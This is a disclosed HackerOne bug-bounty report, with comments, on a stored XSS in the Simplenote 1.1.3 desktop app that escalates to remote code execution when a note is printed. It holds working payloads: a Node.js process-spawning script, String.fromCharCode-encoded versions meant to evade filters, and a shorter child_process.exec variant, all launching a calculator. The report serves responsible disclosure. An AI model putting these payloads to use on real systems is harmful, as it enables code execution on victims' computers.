{"id":358049,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgwNDk=","url":"https://hackerone.com/reports/358049","title":"RCE via Print function [Simplenote 1.1.3 - Desktop app] ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-05-27T09:33:36.011Z","submitted_at":"2018-05-27T09:33:36.011Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"luigigubello","url":"/luigigubello","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-07-26T08:26:07.139Z","bug_reporter_agreed_on_going_public_at":"2018-06-26T08:26:03.226Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\n\nThis report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\n\n# Step to reproduce\n\n## 1 - Prerequisites\n\n- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\n- Markdown must **not** be enabled\n\n## 2 - Stored XSS\n\nCreate a new note, and you write this text:\n```\n\"\u003e'\u003e\u003cdetails/open/ontoggle=confirm('XSS')\u003e\n```\nNow go to **File** --\u003e **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\n\n## 3 - From XSS to RCE\n\nThanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.\nThe code to open the Gnome calculator in Debian is:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nNow you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:\n\n```\n\"\u003e'\u003e\u003cimg src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))\u003e\n```\n\nYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\n\nI have attached two screenshots and a proof-of-concept video.\n\n## Impact\n\nAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.","vulnerability_information_html":"\u003cp\u003eIn \u003cstrong\u003eSimplenote 1.1.3 - Desktop app\u003c/strong\u003e there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\u003c/p\u003e\n\n\u003cp\u003eThis report is based on the \u003ca href=\"https://hackerone.com/reports/291539\"\u003ereport \u003cstrong\u003e#291539\u003c/strong\u003e\u003c/a\u003e, by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\u003c/p\u003e\n\n\u003ch1 id=\"step-to-reproduce\"\u003eStep to reproduce\u003c/h1\u003e\n\n\u003ch2 id=\"1-prerequisites\"\u003e1 - Prerequisites\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eDownload and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\u003c/li\u003e\n\u003cli\u003eMarkdown must \u003cstrong\u003enot\u003c/strong\u003e be enabled\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"2-stored-xss\"\u003e2 - Stored XSS\u003c/h2\u003e\n\n\u003cp\u003eCreate a new note, and you write this text:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026quot;\u0026gt;\u0026#39;\u0026gt;\u0026lt;details/open/ontoggle=confirm(\u0026#39;XSS\u0026#39;)\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow go to \u003cstrong\u003eFile\u003c/strong\u003e --\u0026gt; \u003cstrong\u003ePrint\u003c/strong\u003e. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\u003c/p\u003e\n\n\u003ch2 id=\"3-from-xss-to-rce\"\u003e3 - From XSS to RCE\u003c/h2\u003e\n\n\u003cp\u003eThanks to \u003ca href=\"https://hackerone.com/ysx\"\u003e\u003cstrong\u003eysx\u003c/strong\u003e\u003c/a\u003e, I used the code in his proof-of-concept.\u003cbr\u003e\nThe code to open the Gnome calculator in Debian is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar Process = process.binding(\u0026#39;process_wrap\u0026#39;).Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+\u0026#39;=\u0026#39;+env[key]);\nproc.spawn({file:\u0026#39;/usr/bin/gnome-calculator\u0026#39;,cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:\u0026#39;ignore\u0026#39;},{type:\u0026#39;ignore\u0026#39;},{type:\u0026#39;ignore\u0026#39;}]});\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow you use the functions \u003ccode\u003ewriteln()\u003c/code\u003e and \u003ccode\u003eString.fromCharCode()\u003c/code\u003e to bypass possible filters. So you \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.martineve.com%2F2007%2F05%2F15%2Fjavascript-eval-string-fromcharcode-encoder\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eencode\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the script into unicode values. Now you can create the payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026quot;\u0026gt;\u0026#39;\u0026gt;\u0026lt;img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\u003c/p\u003e\n\n\u003cp\u003eI have attached two screenshots and a proof-of-concept video.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim\u0026#39;s computer.\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":302301,"file_name":"simplenote_rce_screen.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/301/bf86f47e8f3e6b6bdab6fd0ee2e35dba0d8ed32c/simplenote_rce_screen.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054231Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=7969d1f30ddf7aefbf878076b9c2386c4ed0961dbef7acd0d0d122c465867af5","file_size":458022,"type":"image/png"},{"id":302302,"file_name":"simplenote_rce_poc.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/302/2c46c8d847b2d0372cd7cdbf672722b2ac042502/simplenote_rce_poc.mp4?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_poc.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054231Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=fd574b26cf04f6f97788f76c8156e33461c59a65d7e0360c8432be114caedff2","file_size":3254525,"type":"video/mp4"},{"id":302303,"file_name":"simplenote_rce_screen2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/303/499be97b185aca85e2a88a6310183a460cbe7c0f/simplenote_rce_screen2.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen2.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054231Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=57d792feb0bd64e311f83e4908c1c7c543c90c04136dec165d303d2b7a8426d1","file_size":516985,"type":"image/png"}],"allow_singular_disclosure_at":"2018-07-26T08:26:03.366Z","allow_singular_disclosure_after":-76626988.38891563,"singular_disclosure_allowed":true,"vote_count":26,"voters":["muon4","ahiezer","eveeez","geeknik","superman85","apapedulimu","an0nym0us","bountyoverflow","zdkano","naategh","and 16 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2803154,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-27T09:33:56.733Z","updated_at":"2018-05-27T09:33:56.733Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":159968},"actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2803207,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is possible to use a shorter payload:\n`\u003cscript\u003erequire('child_process').exec('/usr/bin/gnome-calculator',function(){})\u003c/script\u003e`\n\nThen you use `writeln()` and `String.FromCharcode()`. The final payload is:\n`\"\u003e'\u003e\u003cdetails/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))\u003e`","markdown_message":"\u003cp\u003eIt is possible to use a shorter payload:\u003cbr\u003e\n\u003ccode\u003e\u0026lt;script\u0026gt;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;/usr/bin/gnome-calculator\u0026#39;,function(){})\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThen you use \u003ccode\u003ewriteln()\u003c/code\u003e and \u003ccode\u003eString.FromCharcode()\u003c/code\u003e. The final payload is:\u003cbr\u003e\n\u003ccode\u003e\u0026quot;\u0026gt;\u0026#39;\u0026gt;\u0026lt;details/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))\u0026gt;\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-27T10:57:47.869Z","updated_at":"2018-05-27T10:57:47.869Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2806324,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report @luigigubello! I remember noticing this a little while ago, but looks like a follow-up PR didn't happen to actually fix it. This report is a great reminder to get it fixed asap!\n\nhttps://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892","markdown_message":"\u003cp\u003eThanks for the report \u003ca href=\"/luigigubello\"\u003e@luigigubello\u003c/a\u003e! I remember noticing this a little while ago, but looks like a follow-up PR didn\u0026#39;t happen to actually fix it. This report is a great reminder to get it fixed asap!\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F724%23discussion_r174950892\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T15:57:08.664Z","updated_at":"2018-05-28T15:57:08.664Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2806357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @roundhill \nI think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/roundhill\"\u003e@roundhill\u003c/a\u003e \u003cbr\u003e\nI think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T16:07:19.854Z","updated_at":"2018-05-28T16:07:19.854Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2806364,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, working on it now. Thanks again.","markdown_message":"\u003cp\u003eYes, working on it now. Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T16:16:38.196Z","updated_at":"2018-05-28T16:16:38.196Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2806370,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good work :)\n\nBest  regards","markdown_message":"\u003cp\u003eGood work :)\u003c/p\u003e\n\n\u003cp\u003eBest  regards\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T16:19:24.848Z","updated_at":"2018-05-28T16:19:24.848Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2844796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi :)\n\nAny news about the fix?","markdown_message":"\u003cp\u003eHi :)\u003c/p\u003e\n\n\u003cp\u003eAny news about the fix?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-05T15:26:25.687Z","updated_at":"2018-06-05T15:26:25.687Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2884111,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @luigigubello, the 1.1.4 update contains the fix for this issue. Can you please confirm?\n\nDetails here: https://github.com/Automattic/simplenote-electron/pull/766","markdown_message":"\u003cp\u003eHi \u003ca href=\"/luigigubello\"\u003e@luigigubello\u003c/a\u003e, the 1.1.4 update contains the fix for this issue. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eDetails here: \u003ca title=\"https://github.com/Automattic/simplenote-electron/pull/766\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F766\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Automattic/simplenote-electron/pull/766\u003c/span\u003e\u003ci 